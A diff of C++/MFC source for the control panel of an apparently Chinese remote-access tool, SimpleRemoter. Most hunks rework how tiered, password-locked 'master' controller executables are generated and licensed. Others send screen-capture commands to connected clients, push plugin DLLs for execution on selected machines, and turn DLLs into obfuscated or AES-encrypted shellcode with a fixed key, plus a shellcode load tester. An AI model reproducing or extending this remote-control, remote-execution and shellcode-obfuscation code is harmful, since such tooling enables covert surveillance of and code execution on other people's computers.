+        Mprintf("错误: 无法创建头文件 %s\n", headerPath.c_str());
+        return false;
+    }
+
+    // 构建完整的 g_MasterID 数组 (_MAX_PATH = 260 字节)
+    // 结构: [0-63] hash, [64-95] check32, [96-99] check4, [100-259] Validation
+    char masterIdArr[_MAX_PATH] = {};
+    WritePwdHash(masterIdArr, pwdHash, verify);
+
+    // 构建完整的 g_UpperHash 数组 (_MAX_PATH = 260 字节)
+    // 结构: [0-99] MASTER_HASH_STR + padding, [100-163] 64字节hash, [164-255] FeatureFlags
+    char upperHashArr[_MAX_PATH] = { MASTER_HASH_STR };
+    memcpy(upperHashArr + 100, masterHash.c_str(), 64);
+    if (newFlags) {
+        memcpy(upperHashArr + FEATURE_FLAGS_OFFSET, newFlags, sizeof(FeatureFlags));
+    }
+
+    // 找到最后一个非零字节的位置
+    auto findLastNonZero = [](const char* arr, int size) {
+        for (int i = size - 1; i >= 0; i--) {
+            if (arr[i] != 0) return i + 1;
+        }
+        return 1;  // 至少返回1，避免空数组
+    };
+    int masterIdLen = findLastNonZero(masterIdArr, _MAX_PATH);
+    int upperHashLen = findLastNonZero(upperHashArr, _MAX_PATH);
+
+    // 输出字节数组的辅助函数
+    auto writeByteArray = [&headerFile](const char* arr, int len) {
+        for (int i = 0; i < len; i++) {
+            if (i % 16 == 0) headerFile << "    ";
+            headerFile << "0x" << std::hex << std::setw(2) << std::setfill('0')
+                       << (unsigned int)(unsigned char)arr[i];
+            if (i < len - 1) headerFile << ", ";
+            if (i % 16 == 15 || i == len - 1) headerFile << "\n";
+        }
+        headerFile << std::dec;
+    };
+
+    headerFile << "// Auto-generated hash file for lower-level agent\n";
+    headerFile << "// Generated at: " << ToPekingTimeAsString(NULL) << "\n\n";
+    headerFile << "#pragma once\n\n";
+    headerFile << "#include <windows.h>\n";
+    headerFile << "#include \"common/hash.h\"\n\n";
+    // 输出 g_MasterID 字节数组（省略尾部零）
+    headerFile << "// 主控程序唯一标识\n";
+    headerFile << "// 密码的哈希值\n";
+    headerFile << "char g_MasterID[_MAX_PATH] = {\n";
+    writeByteArray(masterIdArr, masterIdLen);
+    headerFile << "};\n\n";
+    // 输出 g_UpperHash 字节数组（省略尾部零）
+    headerFile << "char g_UpperHash[_MAX_PATH] = {\n";
+    writeByteArray(upperHashArr, upperHashLen);
+    headerFile << "};\n\n";
+
+    // 输出功能标志注释（便于下级开发商了解限制）
+    if (newFlags && (newFlags->MenuFlags || newFlags->ToolbarFlags || newFlags->ContextFlags)) {
+        headerFile << "// Feature flags set for this level:\n";
+        headerFile << "// MenuFlags:    0x" << std::hex << std::setfill('0')
+                   << std::setw(16) << newFlags->MenuFlags << "\n";
+        headerFile << "// ToolbarFlags: 0x" << std::setw(16) << newFlags->ToolbarFlags << "\n";
+        headerFile << "// ContextFlags: 0x" << std::setw(16) << newFlags->ContextFlags
+                   << std::dec << "\n";
+    }
+    headerFile.close();
+    Mprintf("头文件已生成: %s\n", headerPath.c_str());
+    return true;
+}
+
 void CMy2015RemoteDlg::OnToolGenMaster()
 {
-    // 主控程序公网IP
-    std::string master = THIS_CFG.GetStr("settings", "master", "");
+    // 主控程序公网IP（优先使用上级FRP配置）
+    std::string master;
+    int port;
+    GetEffectiveMasterAddress(master, port);
     if (master.empty())	{
         MessageBoxL("请通过菜单设置当前主控程序的公网地址（域名）! 此地址会写入即将生成的主控程序中。"
-                   "\n只有正确设置公网地址，才能在线延长由本程序所生成的主控程序的有效期。", "提示", MB_ICONINFORMATION);
+                    "\n只有正确设置公网地址，才能在线延长由本程序所生成的主控程序的有效期。", "提示", MB_ICONINFORMATION);
     }
-    std::string masterHash(GetMasterHash());
+    std::string masterHash(GetPwdHash());
+    std::string upperHash(GetMasterHash());
+    bool isSuperAdmin = (masterHash == upperHash);
+    const Validation* curValidation = GetValidation();
+
+    // 非超级管理员需要检查生成深度
+    if (!isSuperAdmin && !curValidation->CanGenerate()) {
+        MessageBoxL(_TR("当前主控程序没有生成下级主控的权限（MaxDepth=0）。\n请联系上级管理员获取授权。"), 
+            _TR("权限不足"), MB_ICONWARNING);
+        return;
+    }
+
     if (m_superPass.empty()) {
         CInputDialog pass(this);
         pass.Init(_TR("主控生成"), _TR("当前主控程序的密码:"));
@@ -3491,18 +6877,63 @@ void CMy2015RemoteDlg::OnToolGenMaster()
         m_superPass = pass.m_str.GetString();
     }
 
-    CInputDialog dlg(this);
-    dlg.Init(_TR("主控密码"), _TR("新的主控程序的密码:"));
-    if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
-        return;
-    if (dlg.m_str.GetLength() > 15) {
-        MessageBoxL("密码长度不能大于15。", "错误", MB_ICONWARNING);
+    // 收集生成参数：深度、密码、天数
+    unsigned short newMaxDepth = 0;
+    CString newPassword, newDays;
+
+    if (isSuperAdmin) {
+        // 超级管理员：3个输入框（深度、密码、天数）
+        CInputDialog dlg(this);
+        dlg.Init(_TR("生成主控"), _TR("可生成的最大层数:"));
+        dlg.m_str = "1";
+        dlg.Init2(_TR("新主控程序密码:"), "");
+        dlg.Init3(_TR("使用天数:"), "365");
+        if (dlg.DoModal() != IDOK)
+            return;
+
+        int inputDepth = atoi(dlg.m_str);
+        if (inputDepth < 0) inputDepth = 0;
+        if (inputDepth > 255) inputDepth = 255;
+        newMaxDepth = (unsigned short)inputDepth;
+        newPassword = dlg.m_sSecondInput;
+        newDays = dlg.m_sThirdInput;
+    } else {
+        // 非超级管理员：深度递减，2个输入框（密码、天数）
+        newMaxDepth = curValidation->MaxDepth - 1;
+
+        CInputDialog dlg(this);
+        dlg.Init(_TR("生成主控"), _TR("新主控程序密码:"));
+        dlg.Init2(_TR("使用天数:"), "365");
+        if (dlg.DoModal() != IDOK)
+            return;
+
+        newPassword = dlg.m_str;
+        newDays = dlg.m_sSecondInput;
+    }
+
+    // 验证输入
+    if (newPassword.IsEmpty()) {
+        MessageBoxL(_TR("密码不能为空。"), _TR("错误"), MB_ICONWARNING);
         return;
     }
-    CInputDialog days(this);
-    days.Init(_TR("使用天数"), _TR("新主控程序使用天数:"));
-    if (days.DoModal() != IDOK || days.m_str.IsEmpty())
+    if (newPassword.GetLength() > 15) {
+        MessageBoxL(_TR("密码长度不能大于15。"), _TR("错误"), MB_ICONWARNING);
         return;
+    }
+    if (newDays.IsEmpty()) {
+        MessageBoxL(_TR("使用天数不能为空。"), _TR("错误"), MB_ICONWARNING);
+        return;
+    }
+
+    // 功能限制对话框
+    CFeatureLimitsDlg limitsDlg(this);
+    const FeatureFlags* inherited = GetFeatureFlags();
+    if (inherited) {
+        limitsDlg.SetInheritedFlags(inherited);
+    }
+    if (limitsDlg.DoModal() != IDOK)
+        return;
+
     size_t size = 0;
     char path[MAX_PATH];
     DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -3514,8 +6945,10 @@ void CMy2015RemoteDlg::OnToolGenMaster()
         MessageBoxL("读取文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
         return;
     }
-    std::string pwdHash = hashSHA256(dlg.m_str.GetString());
-    int iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
+    std::string pwdHash = hashSHA256(newPassword.GetString());
+    // 使用 GetFinderString 生成更长的搜索模式，避免匹配到 .rdata 段的字符串字面量
+    std::string finder = GetFinderString(masterHash.c_str());
+    int iOffset = MemoryFind(curEXE, finder.c_str(), size, finder.length());
     std::string upx = ReleaseUPX();
     if (iOffset == -1) {
         SAFE_DELETE_ARRAY(curEXE);
@@ -3527,20 +6960,38 @@ void CMy2015RemoteDlg::OnToolGenMaster()
             return;
         }
         DeleteFile(tmp.c_str());
-        iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
+        iOffset = MemoryFind(curEXE, finder.c_str(), size, finder.length());
         if (iOffset == -1) {
             SAFE_DELETE_ARRAY(curEXE);
             MessageBoxL("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
             return;
         }
     }
-    int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
     std::string id = genHMAC(pwdHash, m_superPass);
-    Validation verify(atof(days.m_str), master.c_str(), port<=0 ? 6543 : port, id.c_str());
+    Validation verify(atof(newDays), master.c_str(), port<=0 ? 6543 : port, id.c_str(), newMaxDepth);
     if (!WritePwdHash(curEXE + iOffset, pwdHash, verify)) {
         MessageBoxL("写入哈希失败! 无法生成主控。", "错误", MB_ICONWARNING);
         SAFE_DELETE_ARRAY(curEXE);
         return;
+    }
+    // 准备功能标志（在块外定义，便于后续传递给头文件生成函数）
+    FeatureFlags featureFlags = {};
+    memcpy(featureFlags.Version, FEATURE_FLAGS_VERSION, 4);
+    featureFlags.MenuFlags = limitsDlg.GetMenuFlags();
+    featureFlags.ToolbarFlags = limitsDlg.GetToolbarFlags();
+    featureFlags.ContextFlags = limitsDlg.GetContextFlags();
+
+    char str[100] = {}, markArr[] = { MASTER_HASH_STR };
+    memcpy(str, markArr, sizeof(markArr));
+    if (-1 != (iOffset = MemoryFind(curEXE, str, size, sizeof(str)))) {
+		memcpy(curEXE + iOffset + 100, masterHash.c_str(), 64);
+		curEXE[iOffset + 100 + 64] = '\0';  // 确保 null 终止
+
+		// 写入功能标志到 g_UpperHash[164-255]
+		memcpy(curEXE + iOffset + FEATURE_FLAGS_OFFSET, &featureFlags, sizeof(featureFlags));
+    }
+    else {
+		Mprintf("警告: 在主控程序中未找到 MASTER_HASH_STR 标记，无法写入主控哈希。\n");
     }
     CComPtr<IShellFolder> spDesktop;
     HRESULT hr = SHGetDesktopFolder(&spDesktop);
@@ -3550,7 +7001,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
         return;
     }
     // 过滤器：显示所有文件和特定类型文件（例如文本文件）
-    CFileDialog fileDlg(FALSE, _T("exe"), "YAMA.exe", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
+    CFileDialog fileDlg(FALSE, _T("exe"), BRAND_EXE_NAME, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
                         _T("EXE Files (*.exe)|*.exe|All Files (*.*)|*.*||"), AfxGetMainWnd());
     int ret = 0;
     try {
@@ -3565,20 +7016,34 @@ void CMy2015RemoteDlg::OnToolGenMaster()
         CFile File;
         BOOL r = File.Open(name, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
         if (!r) {
-            MessageBoxL("主控程序创建失败!\r\n" + name, "提示", MB_ICONWARNING);
+            MessageBoxL(_TR("主控程序创建失败!") + "\r\n" + name, "提示", MB_ICONWARNING);
             SAFE_DELETE_ARRAY(curEXE);
             return;
         }
         File.Write(curEXE, size);
         File.Close();
+
+        // 生成头文件，包含下级代理所需的哈希信息（固定文件名，下级只需替换此文件）
+        std::string headerPath = std::string(name.GetString());
+        size_t slashPos = headerPath.find_last_of("\\/");
+        if (slashPos != std::string::npos) {
+            headerPath = headerPath.substr(0, slashPos + 1) + "generated_hash.h";
+        } else {
+            headerPath = "generated_hash.h";
+        }
+        GenerateHashHeaderFile(headerPath, pwdHash, verify, masterHash, &featureFlags);
+
+        CString depthInfo;
+        depthInfo.Format(_TR("\r\n生成深度: %d (可继续生成%d层下级)"), newMaxDepth, newMaxDepth);
         if (!upx.empty()) {
 #ifndef _DEBUG // DEBUG 模式用UPX压缩的程序可能无法正常运行
             run_upx_async(GetSafeHwnd(), upx, name.GetString(), true);
-            MessageBoxL("正在UPX压缩，请关注信息提示。\r\n文件位于: " + name, "提示", MB_ICONINFORMATION);
+            MessageBoxL(_TR("正在UPX压缩，请关注信息提示。") + "\r\n" + _TR("文件位于: ") + name + depthInfo, "提示", MB_ICONINFORMATION);
 #endif
         } else
-            MessageBoxL("生成成功! 文件位于:\r\n" + name, "提示", MB_ICONINFORMATION);
+            MessageBoxL(_TR("生成成功! 文件位于:") + "\r\n" + name + depthInfo, "提示", MB_ICONINFORMATION);
     }
+	Mprintf("主控程序生成: PwdHash= %s HMAC= %s MaxDepth= %d. UpperHash: %s.\n", pwdHash.c_str(), id.c_str(), newMaxDepth, masterHash.c_str());
     SAFE_DELETE_ARRAY(curEXE);
 }
 
@@ -3595,15 +7060,19 @@ void CMy2015RemoteDlg::OnHelpImportant()
 
 void CMy2015RemoteDlg::OnHelpFeedback()
 {
-    CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/issues/new");
-    ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
+    CString content = THIS_CFG.GetStr("settings", "FeedbackUrl", BRAND_URL_FEEDBACK).c_str();
+    if (content.Left(4).CompareNoCase(_T("http")) == 0) {
+        ShellExecute(NULL, _T("open"), content, NULL, NULL, SW_SHOWNORMAL);
+    } else {
+        MessageBoxL(content, _TR("反馈"), MB_ICONINFORMATION);
+    }
 }
 
 void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID)
 {
     if (m_DllList.size() == 0) {
-        MessageBoxL("请将64位的DLL放于主控程序的 'Plugins' 目录，再来点击此项菜单。"
-                    "\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION);
+        MessageBoxL(_L("请将64位的DLL放于主控程序的 'Plugins' 目录，再来点击此项菜单。")+
+                    _L("\n执行未经测试的代码可能造成程序崩溃。"), "提示", MB_ICONINFORMATION);
         char path[_MAX_PATH];
         GetModuleFileNameA(NULL, path, _MAX_PATH);
         GET_FILEPATH(path, "Plugins");
@@ -3616,14 +7085,15 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID)
     while (Pos && menuIndex < m_DllList.size()) {
         Buffer* buf = m_DllList[menuIndex]->Data;
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        context* ContextObject = GetContextByListIndex(iItem);
+        if (!ContextObject) continue;
         ContextObject->Send2Client( buf->Buf(), 1 + sizeof(DllExecuteInfo) );
     }
     LeaveCriticalSection(&m_cs);
 }
 void CMy2015RemoteDlg::OnOnlineVirtualDesktop()
 {
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen") };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen", TRUE) };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
@@ -3632,7 +7102,7 @@ void CMy2015RemoteDlg::OnOnlineGrayDesktop()
 {
     if (!ShouldRemoteControl())
         return;
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY, THIS_CFG.GetInt("settings", "MultiScreen") };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY, THIS_CFG.GetInt("settings", "MultiScreen", TRUE) };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
@@ -3641,7 +7111,7 @@ void CMy2015RemoteDlg::OnOnlineRemoteDesktop()
 {
     if (!ShouldRemoteControl())
         return;
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen") };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen", TRUE) };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
@@ -3650,26 +7120,41 @@ void CMy2015RemoteDlg::OnOnlineH264Desktop()
 {
     if (!ShouldRemoteControl())
         return;
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264, THIS_CFG.GetInt("settings", "MultiScreen") };
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264, THIS_CFG.GetInt("settings", "MultiScreen", TRUE) };
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
 
 void CMy2015RemoteDlg::OnWhatIsThis()
 {
-    CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki");
-    ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
+    CString content = THIS_CFG.GetStr("settings", "HelpUrl", BRAND_URL_WIKI).c_str();
+    if (content.Left(4).CompareNoCase(_T("http")) == 0) {
+        ShellExecute(NULL, _T("open"), content, NULL, NULL, SW_SHOWNORMAL);
+    } else {
+        MessageBoxL(content, _TR("帮助"), MB_ICONINFORMATION);
+    }
 }
 
 
 void CMy2015RemoteDlg::OnOnlineAuthorize()
 {
+    // 检查选中的客户端是否已在授权数据库中
+    std::string ip, machineName, sn;
+    EnterCriticalSection(&m_cs);
+    int nItem = m_CList_Online.GetNextItem(-1, LVNI_SELECTED);
+    context* ctx = GetContextByListIndex(nItem);
+    if (ctx) {
+        ip = ctx->GetClientData(ONLINELIST_IP).GetString();
+        machineName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME).GetString();
+    }
+    LeaveCriticalSection(&m_cs);
+
     if (m_superPass.empty()) {
         CInputDialog pass(this);
         pass.Init(_TR("需要密码"), _TR("当前主控程序的密码:"));
         if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
             return;
-        std::string masterHash(GetMasterHash());
+        std::string masterHash(GetPwdHash());
         if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
             MessageBoxL("密码不正确!", "错误", MB_ICONWARNING);
             return;
@@ -3678,8 +7163,8 @@ void CMy2015RemoteDlg::OnOnlineAuthorize()
     }
 
     CInputDialog dlg(this);
-    dlg.Init(_TR("延长授权"), _TR("主控程序授权天数:"));
-    dlg.Init2(_TR("并发上线机器数量:"), std::to_string(100).c_str());
+    dlg.Init(_TR("发送授权"), _TR("授权天数:"));
+    dlg.Init2(_TR("并发连接数:"), std::to_string(100).c_str());
     if (dlg.DoModal() != IDOK || atoi(dlg.m_str) <= 0)
         return;
     BYTE	bToken[32] = { CMD_AUTHORIZATION };
@@ -3709,8 +7194,7 @@ CString GetElapsedTime(LPCTSTR szBaseTime)
 {
     int nYear, nMonth, nDay, nHour, nMin, nSec;
     if (_stscanf_s(szBaseTime, _T("%d-%d-%d %d:%d:%d"),
-        &nYear, &nMonth, &nDay, &nHour, &nMin, &nSec) != 6)
-    {
+                   &nYear, &nMonth, &nDay, &nHour, &nMin, &nSec) != 6) {
         return _T("0s");
     }
 
@@ -3732,12 +7216,14 @@ CString GetElapsedTime(LPCTSTR szBaseTime)
 void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
 {
     LPNMITEMACTIVATE pNMItem = (LPNMITEMACTIVATE)pNMHDR;
+    int iItem = pNMItem->iItem;
 
-    if (pNMItem->iItem >= 0) {
+    CLock lock(m_cs);
+    context* ctx = GetContextByListIndex(iItem);
+    if (ctx) {
         // 获取数据
-        context* ctx = (context*)m_CList_Online.GetItemData(pNMItem->iItem);
         CString res[RES_MAX];
-        CString startTime = ctx->GetClientData(ONLINELIST_LOGINTIME);
+        CString startTime = ctx->GetClientData(ONLINELIST_STARTTIME);
         ctx->GetAdditionalData(res);
         FlagType type = ctx->GetFlagType();
         static std::map<FlagType, std::string> typMap = {
@@ -3752,11 +7238,17 @@ void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
         CString strText;
         std::string expired = res[RES_EXPIRED_DATE];
         expired = expired.empty() ? "" : " Expired on " + expired;
-        strText.FormatL(_T("文件路径: %s%s %s%s\r\n系统信息: %s 位 %s 核心 %s GB %s\r\n启动信息: %s %s %s%s %s\r\n上线信息: %s %d %s\r\n客户信息: %s"),
-                       res[RES_PROGRAM_BITS].IsEmpty() ? "" : res[RES_PROGRAM_BITS] + " 位 ", res[RES_FILE_PATH], res[RES_EXE_VERSION], processInfo,
-                       res[RES_SYSTEM_BITS], res[RES_SYSTEM_CPU], res[RES_SYSTEM_MEM], res[RES_RESOLUTION], startTime, expired.c_str(),
-                       res[RES_USERNAME], res[RES_ISADMIN] == "1" ? "[管理员]" : res[RES_ISADMIN].IsEmpty() ? "" : "[非管理员]", GetElapsedTime(startTime),
-                       ctx->GetProtocol().c_str(), ctx->GetServerPort(), typMap[type].c_str(), res[RES_CLIENT_ID]);
+        strText.FormatL(_T("文件路径: %s%s %s%s\r\n系统信息: %s 位 %s 核心 %s GB %s\r\n启动信息: %s %s %s%s %s\r\n上线信息: %s %d %s Master-%s\r\n客户信息: %s"),
+                        res[RES_PROGRAM_BITS].IsEmpty() ? "" : res[RES_PROGRAM_BITS] + _L(" 位 "), res[RES_FILE_PATH], res[RES_EXE_VERSION], processInfo,
+                        res[RES_SYSTEM_BITS], res[RES_SYSTEM_CPU], res[RES_SYSTEM_MEM], res[RES_RESOLUTION], startTime, expired.c_str(),
+                        res[RES_USERNAME], res[RES_ISADMIN] == "1" ? _L("[管理员]") : res[RES_ISADMIN].IsEmpty() ? "" : _L("[非管理员]"), GetElapsedTime(startTime),
+                        ctx->GetProtocol().c_str(), ctx->GetServerPort(), typMap[type].c_str(), ctx->GetMasterID().c_str(), res[RES_CLIENT_ID]);
+        std::string geo = res[RES_CLIENT_PUBIP].IsEmpty() ? "" : m_IPConverter->GetGeoLocation(res[RES_CLIENT_PUBIP].GetString());
+        if (m_HasLocDB) {
+            CString qqwryLoc;
+            qqwryLoc.FormatL("\r\n地理信息: %s", geo.c_str());
+            strText += qqwryLoc;
+        }
 
         // 获取鼠标位置
         CPoint pt;
@@ -3769,7 +7261,7 @@ void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
         m_pFloatingTip = new CWnd();
         int width = res[RES_FILE_PATH].GetLength() * 10 + 36;
         width = min(max(width, 360), 800);
-        CRect rect(pt.x, pt.y, pt.x + width, pt.y + 100); // 宽度、高度
+        CRect rect(pt.x, pt.y, pt.x + width, pt.y + 120); // 宽度、高度
 
         BOOL bOk = m_pFloatingTip->CreateEx(
                        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
@@ -3795,12 +7287,23 @@ void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
 
 void CMy2015RemoteDlg::OnOnlineUnauthorize()
 {
+    // 检查选中的客户端是否已在授权数据库中
+    std::string ip, machineName, sn;
+    EnterCriticalSection(&m_cs);
+    int nItem = m_CList_Online.GetNextItem(-1, LVNI_SELECTED);
+    context* ctx = GetContextByListIndex(nItem);
+    if (ctx) {
+        ip = ctx->GetClientData(ONLINELIST_IP).GetString();
+        machineName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME).GetString();
+    }
+    LeaveCriticalSection(&m_cs);
+
     if (m_superPass.empty()) {
         CInputDialog pass(this);
         pass.Init(_TR("需要密码"), _TR("当前主控程序的密码:"));
         if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
             return;
-        std::string masterHash(GetMasterHash());
+        std::string masterHash(GetPwdHash());
         if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
             MessageBoxL("密码不正确!", "错误", MB_ICONWARNING);
             return;
@@ -3835,8 +7338,12 @@ void CMy2015RemoteDlg::OnToolRequestAuth()
     if (!noPwd)
         dlg.Init2(_TR("授权口令:"), pwd.c_str());
     if (IDOK == dlg.DoModal() && noPwd) {
-        CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#请求授权");
-        ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
+        CString content = THIS_CFG.GetStr("settings", "RequestAuthUrl", BRAND_URL_REQUEST_AUTH).c_str();
+        if (content.Left(4).CompareNoCase(_T("http")) == 0) {
+            ShellExecute(NULL, _T("open"), content, NULL, NULL, SW_SHOWNORMAL);
+        } else {
+            MessageBoxL(content, _TR("请求授权"), MB_ICONINFORMATION);
+        }
     }
 }
 
@@ -3847,8 +7354,8 @@ void CMy2015RemoteDlg::OnToolInputPassword()
         CString pwd = THIS_CFG.GetStr("settings", "Password", "").c_str();
         auto v = splitString(pwd.GetBuffer(), '-');
         CString info;
-        info.FormatL("软件有效期限: %s — %s, 并发连接数量: %d.", v[0].c_str(), v[1].c_str(), atoi(v[2].c_str()));
-        if (IDYES == MessageBoxL(info + "\n如需修改授权信息，请联系管理员。是否现在修改授权？", "提示", MB_YESNO | MB_ICONINFORMATION)) {
+        info.FormatL("软件有效期限: %s ~ %s, 并发连接数量: %d.", v[0].c_str(), v[1].c_str(), atoi(v[2].c_str()));
+        if (IDYES == MessageBoxL(info + _TR("\n如需修改授权信息，请联系管理员。是否现在修改授权？"), "提示", MB_YESNO | MB_ICONINFORMATION)) {
             CPasswordDlg dlg(this);
             std::string hardwareID = GetHardwareID();
             std::string hashedID = hashSHA256(hardwareID);
@@ -3857,6 +7364,7 @@ void CMy2015RemoteDlg::OnToolInputPassword()
             dlg.m_sPassword = THIS_CFG.GetStr("settings", "Password", "").c_str();
             dlg.m_sPasscodeHmac = THIS_CFG.GetStr("settings", "PwdHmac", "").c_str();
             if (IDOK == dlg.DoModal() && !dlg.m_sPassword.IsEmpty()) {
+                THIS_CFG.SetStr("settings", "SN", dlg.m_sDeviceID.GetString());
                 THIS_CFG.SetStr("settings", "Password", dlg.m_sPassword.GetString());
                 THIS_CFG.SetStr("settings", "PwdHmac", dlg.m_sPasscodeHmac.GetString());
 #ifdef _DEBUG
@@ -3899,7 +7407,8 @@ int main() {
 void shellcode_process(ObfsBase *obfs, bool load = false, const char* suffix = ".c")
 {
     CFileDialog fileDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
-                        _T("DLL Files (*.dll)|*.dll|BIN Files (*.bin)|*.bin|All Files (*.*)|*.*||"), AfxGetMainWnd());
+        load ? _T("BIN Files (*.bin)|*.bin|All Files (*.*)|*.*||"):
+        _T("DLL Files (*.dll)|*.dll|All Files (*.*)|*.*||"), AfxGetMainWnd());
     int ret = 0;
     try {
         ret = fileDlg.DoModal();
@@ -3912,7 +7421,7 @@ void shellcode_process(ObfsBase *obfs, bool load = false, const char* suffix = "
         CFile File;
         BOOL r = File.Open(name, CFile::typeBinary | CFile::modeRead);
         if (!r) {
-            AfxMessageBoxL("文件打开失败! 请稍后再试。\r\n" + name, MB_ICONWARNING);
+            AfxMessageBoxL(_TR("文件打开失败! 请稍后再试。") + "\r\n" + name, MB_ICONWARNING);
             return;
         }
         int dwFileSize = File.GetLength();
@@ -3943,8 +7452,8 @@ void shellcode_process(ObfsBase *obfs, bool load = false, const char* suffix = "
             const uint32_t key = 0xDEADBEEF;
             obfs->ObfuscateBuffer(srcData, srcLen, key);
             if (obfs->WriteFile(CString(buffer) + suffix, srcData, srcLen, "Shellcode")) {
-                AfxMessageBoxL("Shellcode 生成成功! 请自行编写调用程序。\r\n" + CString(buffer) + suffix,
-                              MB_ICONINFORMATION);
+                AfxMessageBoxL(_TR("Shellcode 生成成功! 请自行编写调用程序。") + "\r\n" + CString(buffer) + suffix,
+                               MB_ICONINFORMATION);
             }
         }
         SAFE_DELETE_ARRAY(srcData);
@@ -3986,9 +7495,9 @@ void CMy2015RemoteDlg::OnObfsShellcodeBin()
 
 void CMy2015RemoteDlg::OnShellcodeLoadTest()
 {
-    if (MessageBoxL(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
-                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
-                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+    if (MessageBoxL(CString(_TR("是否测试 ")) + (sizeof(void*) == 8 ? _TR("64位") : _TR("32位")) +
+                            _TR(" Shellcode 二进制文件? 请选择受信任的 bin 文件。") + "\r\n" + _TR("测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。"),
+                            "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
         ObfsBase obfs;
         shellcode_process(&obfs, true);
     }
@@ -3997,9 +7506,9 @@ void CMy2015RemoteDlg::OnShellcodeLoadTest()
 
 void CMy2015RemoteDlg::OnShellcodeObfsLoadTest()
 {
-    if (MessageBoxL(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
-                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
-                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+    if (MessageBoxL(CString(_TR("是否测试 ")) + (sizeof(void*) == 8 ? _TR("64位") : _TR("32位")) +
+                            _TR(" Shellcode 二进制文件? 请选择受信任的 bin 文件。") + "\r\n" + _TR("测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。"),
+                            "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
         Obfs obfs;
         shellcode_process(&obfs, true);
     }
@@ -4015,9 +7524,9 @@ void CMy2015RemoteDlg::OnShellcodeAesBin()
 
 void CMy2015RemoteDlg::OnShellcodeTestAesBin()
 {
-    if (MessageBoxL(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
-                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
-                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+    if (MessageBoxL(CString(_TR("是否测试 ")) + (sizeof(void*) == 8 ? _TR("64位") : _TR("32位")) +
+                            _TR(" Shellcode 二进制文件? 请选择受信任的 bin 文件。") + "\r\n" + _TR("测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。"),
+                            "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
         ObfsAes obfs;
         shellcode_process(&obfs, true);
     }
@@ -4027,6 +7536,7 @@ void CMy2015RemoteDlg::OnOnlineAssignTo()
 {
     CInputDialog dlg(this);
